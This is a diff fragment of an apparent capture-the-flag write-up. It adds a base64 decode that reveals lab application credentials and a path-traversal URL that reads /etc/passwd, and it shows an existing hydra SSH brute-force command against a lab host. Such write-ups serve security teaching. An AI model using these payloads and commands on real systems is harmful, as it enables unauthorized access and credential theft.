@@ -64,19 +64,29 @@ Nmap done: 1 IP address (1 host up) scanned in 34.79 seconds
 <img width="1418" height="930" alt="image" src="https://github.com/user-attachments/assets/c9fbe5e4-4e4e-4126-9e6a-c772195f5c80" />
 
 
+
 <img width="1091" height="266" alt="image" src="https://github.com/user-attachments/assets/e933baa2-9232-4b57-8b28-2b25ba73177e" />
+
 
 
 <img width="1411" height="1012" alt="add details" src="https://github.com/user-attachments/assets/a40fccbd-524f-498d-96f0-4b8cec3c0d1e" />
 
+```bash
+root@ip-10-201-98-84:~# echo "eyJSZXZpZXdBcHBVc2eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 --decode
+{"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
+```
+---
+
+<img width="908" height="297" alt="image" src="https://github.com/user-attachments/assets/5b682101-b907-460d-afc3-31eb9cac0b4e" />
 
 
+---
 
 `http://10.201.57.150:50000/profile.php?img=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd`
 
 <img width="1424" height="392" alt="image" src="https://github.com/user-attachments/assets/015cbabc-19ac-4e3c-8e66-7ea5164bb718" />
 
-
+---
 
 ```bash
 hydra -l joshua -P /usr/share/wordlists/fasttrack.txt 10.201.57.150 ssh
